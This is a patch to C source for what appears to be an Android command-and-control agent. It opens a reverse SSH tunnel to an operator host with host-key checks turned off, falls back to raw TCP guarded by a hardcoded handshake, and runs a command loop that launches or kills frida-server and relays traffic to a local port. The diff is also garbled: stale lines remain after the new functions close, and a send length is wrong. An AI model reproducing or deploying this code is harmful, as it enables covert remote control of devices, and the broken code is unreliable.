@@ -63,6 +63,86 @@ void adaptive_policy_loop() {
 
 // Establish reverse tunnel to operator
 int establish_reverse_tunnel(const char* operator_host, int operator_port) {
+    // Try SSH reverse tunnel first
+    if (access("/system/bin/ssh", X_OK) == 0) {
+        printf("SSH available - attempting SSH reverse tunnel\n");
+        
+        // Fork and exec SSH with reverse tunnel
+        pid_t ssh_pid = fork();
+        if (ssh_pid == 0) {
+            // Child: exec SSH
+            char port_str[16];
+            snprintf(port_str, sizeof(port_str), "%d", operator_port);
+            char tunnel_spec[64];
+            snprintf(tunnel_spec, sizeof(tunnel_spec), "%d:localhost:%d", operator_port, TUNNEL_LISTEN_PORT);
+            
+            execl("/system/bin/ssh", "ssh",
+                  "-i", "/data/local/tmp/c2a_key",
+                  "-o", "StrictHostKeyChecking=no",
+                  "-o", "UserKnownHostsFile=/dev/null",
+                  "-o", "ServerAliveInterval=30",
+                  "-o", "ServerAliveCountMax=3",
+                  "-N", "-R", tunnel_spec,
+                  operator_host, NULL);
+            perror("execl ssh failed");
+            _exit(1);
+        } else if (ssh_pid < 0) {
+            perror("fork");
+            // Fall through to raw TCP
+        } else {
+            // Parent: wait briefly to see if SSH connects
+            sleep(2);
+            int status;
+            pid_t result = waitpid(ssh_pid, &status, WNOHANG);
+            if (result == 0) {
+                // SSH is still running - success
+                printf("SSH reverse tunnel established (PID: %d)\n", ssh_pid);
+                // SSH runs in background; we return a dummy socket
+                // The caller should monitor the SSH process
+                return ssh_pid > 0 ? ssh_pid : -1;
+            } else {
+                printf("SSH failed to connect, falling back to raw TCP\n");
+            }
+        }
+    }
+    
+    // Raw TCP fallback
+    printf("Using raw TCP tunnel\n");
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) {
+        perror("socket");
+        return -1;
+    }
+    
+    struct sockaddr_in addr;
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(operator_port);
+    inet_pton(AF_INET, operator_host, &addr.sin_addr);
+    
+    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
+        perror("connect");
+        close(sock);
+        return -1;
+    }
+    
+    // PSK handshake
+    unsigned char challenge[4] = {0xDE, 0xAD, 0xBE, 0xEF};
+    send(sock, challenge, 4, 0);
+    
+    unsigned char response[4];
+    recv(sock, response, 4, 0);
+    
+    unsigned char expected[4] = {0xEF, 0xBE, 0xAD, 0xDE};
+    if (memcmp(response, expected, 4) != 0) {
+        printf("PSK handshake failed\n");
+        close(sock);
+        return -1;
+    }
+    
+    printf("Raw TCP reverse tunnel established to operator\n");
+    return sock;
+}
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) {
         perror("socket");
@@ -189,8 +269,130 @@ static void proxy_loop(int tunnel_sock, int local_port) {
     
     close(local_sock);
 }
-// Handle commands from operator
-void handle_operator_commands(int tunnel_sock) {
+// Unified main loop: multiplex commands and proxy data via select()
+void main_loop(int tunnel_sock) {
+    unsigned char buffer[MAX_BUFFER];
+    int local_sock = -1;
+    
+    // Try to connect to local service (port 7080) for proxying
+    // Non-blocking: if local service isn't up yet, we just handle commands
+    struct sockaddr_in local_addr;
+    memset(&local_addr, 0, sizeof(local_addr));
+    local_addr.sin_family = AF_INET;
+    local_addr.sin_port = htons(TUNNEL_LISTEN_PORT);
+    inet_pton(AF_INET, "127.0.0.1", &local_addr.sin_addr);
+    
+    while (1) {
+        fd_set read_fds;
+        FD_ZERO(&read_fds);
+        FD_SET(tunnel_sock, &read_fds);
+        int max_fd = tunnel_sock;
+        
+        if (local_sock >= 0) {
+            FD_SET(local_sock, &read_fds);
+            if (local_sock > max_fd) max_fd = local_sock;
+        }
+        
+        // Try connecting to local service if not connected
+        if (local_sock < 0) {
+            int sock = socket(AF_INET, SOCK_STREAM, 0);
+            if (sock >= 0) {
+                // Non-blocking connect
+                int flags = fcntl(sock, F_GETFL, 0);
+                fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+                connect(sock, (struct sockaddr*)&local_addr, sizeof(local_addr));
+                // Check if connected
+                fd_set write_fds;
+                FD_ZERO(&write_fds);
+                FD_SET(sock, &write_fds);
+                struct timeval tv = {0, 100000}; // 100ms timeout
+                if (select(sock + 1, NULL, &write_fds, NULL, &tv) > 0) {
+                    int err = 0;
+                    socklen_t len = sizeof(err);
+                    getsockopt(sock, SOL_SOCKET, SO_ERROR, &err, &len);
+                    if (err == 0) {
+                        // Connected successfully
+                        fcntl(sock, F_SETFL, flags); // Back to blocking
+                        local_sock = sock;
+                        printf("Connected to local service on port %d\n", TUNNEL_LISTEN_PORT);
+                    } else {
+                        close(sock);
+                    }
+                } else {
+                    close(sock);
+                }
+            }
+        }
+        
+        struct timeval timeout = {1, 0}; // 1 second timeout
+        int activity = select(max_fd + 1, &read_fds, NULL, NULL, &timeout);
+        
+        if (activity < 0) {
+            if (errno == EINTR) continue;
+            perror("select");
+            break;
+        }
+        
+        if (activity == 0) {
+            // Timeout - continue loop
+            continue;
+        }
+        
+        // Data from tunnel
+        if (FD_ISSET(tunnel_sock, &read_fds)) {
+            int bytes = recv(tunnel_sock, buffer, MAX_BUFFER, 0);
+            if (bytes <= 0) {
+                printf("Tunnel closed\n");
+                break;
+            }
+            
+            // Check if it's a JSON command
+            if (buffer[0] == '{') {
+                char* cmd_str = (char*)buffer;
+                if (bytes < MAX_BUFFER) cmd_str[bytes] = '\0';
+                else cmd_str[MAX_BUFFER - 1] = '\0';
+                
+                if (strstr(cmd_str, "\"action\":\"START_FRIDA\"") || strstr(cmd_str, "\"action\": \"START_FRIDA\"")) {
+                    printf("Command: START_FRIDA\n");
+                    launch_frida_server();
+                    send(tunnel_sock, "{\"status\":\"ok\"}", 13, 0);
+                } else if (strstr(cmd_str, "\"action\":\"STOP_FRIDA\"") || strstr(cmd_str, "\"action\": \"STOP_FRIDA\"")) {
+                    printf("Command: STOP_FRIDA\n");
+                    system("pkill -x frida-server");
+                    send(tunnel_sock, "{\"status\":\"ok\"}", 13, 0);
+                } else if (strstr(cmd_str, "\"action\":\"KILL\"") || strstr(cmd_str, "\"action\": \"KILL\"")) {
+                    printf("Command: KILL\n");
+                    send(tunnel_sock, "{\"status\":\"ok\"}", 13, 0);
+                    break;
+                } else {
+                    // Not a recognized command - forward to local service
+                    if (local_sock >= 0) {
+                        send(local_sock, buffer, bytes, 0);
+                    }
+                }
+            } else {
+                // Raw data - forward to local service
+                if (local_sock >= 0) {
+                    send(local_sock, buffer, bytes, 0);
+                }
+            }
+        }
+        
+        // Data from local service
+        if (local_sock >= 0 && FD_ISSET(local_sock, &read_fds)) {
+            int bytes = recv(local_sock, buffer, MAX_BUFFER, 0);
+            if (bytes <= 0) {
+                printf("Local service closed\n");
+                close(local_sock);
+                local_sock = -1;
+            } else {
+                send(tunnel_sock, buffer, bytes, 0);
+            }
+        }
+    }
+    
+    if (local_sock >= 0) close(local_sock);
+}
     unsigned char buffer[MAX_BUFFER];
     
     while (1) {
@@ -274,21 +476,8 @@ int main(int argc, char* argv[]) {
         exit(0);
     }
     
-    // 4. Main loop: handle commands from operator + proxy data
-    // Start proxy loop in a separate process
-    pid_t proxy_pid = fork();
-    if (proxy_pid == 0) {
-        proxy_loop(tunnel_sock, TUNNEL_LISTEN_PORT);
-        exit(0);
-    }
-    
-    // Handle operator commands in main process
-    handle_operator_commands(tunnel_sock);
-    
-    // Cleanup
-    if (proxy_pid > 0) {
-        kill(proxy_pid, SIGTERM);
-    }
+    // 4. Main loop: multiplex commands and proxy data
+    main_loop(tunnel_sock);
     
     // Cleanup
     if (frida_pid > 0) {
